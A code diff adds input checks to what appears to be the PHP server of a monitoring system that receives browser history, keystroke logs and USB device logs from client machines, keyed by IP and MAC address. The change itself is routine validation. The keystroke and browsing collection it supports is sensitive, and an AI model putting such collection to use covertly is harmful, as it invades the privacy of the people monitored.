@@ -88,6 +88,9 @@ try {
                 http_response_code(400);echo json_encode(['error'=>'Invalid browser history batch']);exit;
             }
             if (!empty($browserHistories)) {
+                foreach($browserHistories as $record){
+                    if(!is_array($record)){http_response_code(400);echo json_encode(['error'=>'Malformed browser record']);exit;}
+                }
                 $inserted_count = $dbService->addBrowserHistoryLogs($browserHistories, $clientIP, $macAddress);
                 // Update monitor activity for browser history logging (pass MAC address)
                 $dbService->updateMonitorActivity($clientIP, 'browser', $macAddress);
@@ -103,6 +106,9 @@ try {
                 http_response_code(400);echo json_encode(['error'=>'Invalid key log batch']);exit;
             }
             if (!empty($keyLogs)) {
+                foreach($keyLogs as $record){
+                    if(!is_array($record)){http_response_code(400);echo json_encode(['error'=>'Malformed key record']);exit;}
+                }
                 $inserted_count = $dbService->addKeyLogs($keyLogs, $clientIP, $macAddress);
                 // Update monitor activity for key logging (pass MAC address)
                 $dbService->updateMonitorActivity($clientIP, 'monitor', $macAddress);
@@ -118,6 +124,9 @@ try {
                 http_response_code(400);echo json_encode(['error'=>'Invalid USB log batch']);exit;
             }
             if (!empty($usbLogs)) {
+                foreach($usbLogs as $record){
+                    if(!is_array($record)){http_response_code(400);echo json_encode(['error'=>'Malformed USB record']);exit;}
+                }
                 $inserted_count = $dbService->addUSBDeviceLogs($usbLogs, $clientIP, $macAddress);
                 // Update monitor activity for USB logging (pass MAC address)
                 $dbService->updateMonitorActivity($clientIP, 'monitor', $macAddress);
